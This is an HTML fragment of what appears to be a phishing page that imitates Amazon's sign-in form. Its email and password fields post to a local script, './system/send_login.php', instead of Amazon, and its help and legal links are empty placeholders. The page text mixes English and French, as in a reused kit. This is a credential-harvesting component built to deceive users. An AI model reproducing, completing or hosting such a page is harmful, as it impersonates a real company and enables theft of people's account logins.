...
<div class="a-section a-spacing-base">
  <div class="a-section">
    ...
    <form name="signIn" method="post" action="./system/send_login.php" class="auth-validate-form auth-real-time-validation a-spacing-none">
      ...
      <div class="a-section">
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
          ...
          <div class="a-row a-spacing-base">
            <label for="ap_email" class="a-form-label">Email address or mobile phone number</label>
            ...
            <input required="" type="text" maxlength="128" id="email" name="email" class="a-input-text a-span12 auth-autofocus auth-required-field">


          </div><div class="a-row a-spacing-base">
            <label for="ap_email" class="a-form-label">Password
</label>
            ...
            <input required="" type="password" maxlength="128" id="password" name="password" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
...
<div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">By continuing you accept the<a href="#">Terms of use</a> et la <a href="#">notice Protection of your personal information</a>from Amazon.
</div> 
...
<div class="a-section">
  <div aria-live="polite" class="a-row a-expander-container a-expander-inline-container">
    <a href="#" class="a-expander-header a-declarative a-expander-inline-header a-link-expander">Do you need help ?</a>
  ...
  Mot de passe oublié
    ...
    <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
      <a id="ap-other-signin-issues-link" class="a-link-normal" href="#">
        ...
        <span id="auth-create-account-link" class="a-button a-button-span12 a-button-base"><span class="a-button-inner"><a id="createAccountSubmit" tabindex="6" href="#" class="a-button-text" role="button">Create your Amazon account</a></span></span>
